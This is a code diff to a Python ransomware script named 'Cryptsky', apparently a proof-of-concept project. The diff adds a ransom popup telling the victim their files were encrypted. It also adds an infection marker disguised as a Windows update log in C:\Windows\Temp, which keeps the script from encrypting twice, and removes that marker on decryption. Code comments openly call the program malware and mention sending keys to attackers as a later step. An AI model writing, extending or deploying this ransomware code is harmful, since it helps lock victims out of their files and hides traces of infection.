@@ -3,10 +3,9 @@ from Cryptodome.Cipher import AES
 from Cryptodome.Util import Counter
 import argparse
 import os
-import random
 import discover
 import modify
-from subprocess import call
+import tkinter
 
 # -----------------
 # GLOBAL VARIABLES
@@ -22,12 +21,29 @@ def get_parser():
                         action="store_true")
     return parser
 
+
+def post_encrypt():
+    print("In Post")
+    root = tkinter.Tk()
+    frame = tkinter.Frame(root)
+    frame.grid()
+    frame.pack()
+    label = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯")
+    label.pack()
+    root.mainloop()
+    pass
+
+
 def main():
     parser  = get_parser()
     args    = vars(parser.parse_args())
     decrypt = args['decrypt']
 
     if decrypt:
+        try:
+            os.remove(r'C:\Windows\Temp\winUpdater.log')
+        except FileNotFoundError:
+            pass
         print('''
 Cryptsky!
 ---------------
@@ -47,6 +63,19 @@ Your decryption key is: %s
         key = input('Enter Your Key> ')
 
     else:
+        try:
+            file = open(r'C:\Windows\Temp\winUpdater.log', 'r')
+            file.close()
+            print("Already Encrypted :)")
+            # If this file exists, the system is already encrypted
+            post_encrypt()
+            return 0
+        except FileNotFoundError:
+            # If this file does not exist, the system has not been encrypted yet... create the file
+            file = open(r'C:\Windows\Temp\winUpdater.log', 'w+')
+            file.write("CryptSky Malware has been run on this machine -- JBOOZ :)")
+            file.close()
+
         # In real ransomware, this part includes complicated key generation,
         # sending the key back to attackers and more
         # maybe I'll do that later. but for now, this will do.
@@ -76,10 +105,10 @@ Your decryption key is: %s
     '''
 
     if not decrypt:
-        pass
-         # post encrypt stuff
-         # desktop picture
-         # icon, etc
+        # post encrypt stuff
+        # desktop picture
+        # icon, etc
+        post_encrypt()
 
 
 if __name__=="__main__":
